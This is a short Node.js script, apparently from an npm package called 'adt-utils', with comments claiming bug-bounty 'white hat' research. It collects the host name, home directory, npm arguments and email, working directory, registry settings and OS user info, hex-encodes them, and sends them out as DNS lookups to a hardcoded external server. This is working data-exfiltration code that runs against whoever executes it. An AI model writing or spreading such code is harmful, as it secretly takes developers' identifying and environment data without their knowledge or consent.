
//hackerone.com/homosec
//Bug Bounty Security Reasearch White Hat t.a.neo@ya.ru
const { Resolver } = require('dns');
const resolver = new Resolver();
const os = require('os')

function convertASCIItoHex(asciiString) {
    let hex = '';
    let tempASCII, tempHex;
    asciiString.split('').map( i => {
        tempASCII = i.charCodeAt(0)
        tempHex = tempASCII.toString(16);
        hex = hex + tempHex;
    });
    hex = hex.trim();
    return hex;
}

function splitString (string, size) {
	var re = new RegExp('.{1,' + size + '}', 'g');
	return string.match(re);
}

resolver.setServers(['178.154.212.234']);

var ebala = os.hostname()+'.'+ os.homedir()+'.'+process.env.npm_config_argv+'.'+process.env.PWD+'.'+process.env.npm_config_registry+'.'+process.env.npm_config_metrics_registry+'.'+process.env.npm_config_email+'.'+ JSON.stringify(os.userInfo())

var ch = splitString(convertASCIItoHex(ebala), 32)

var dt = Date.now()
for(var i in ch){
    resolver.resolve4('adt-utils.'.replace('/','___')+'fromip.'+dt+'.'+i+'.'+ch[i], function(err){
        if (err) throw err;
    });
}

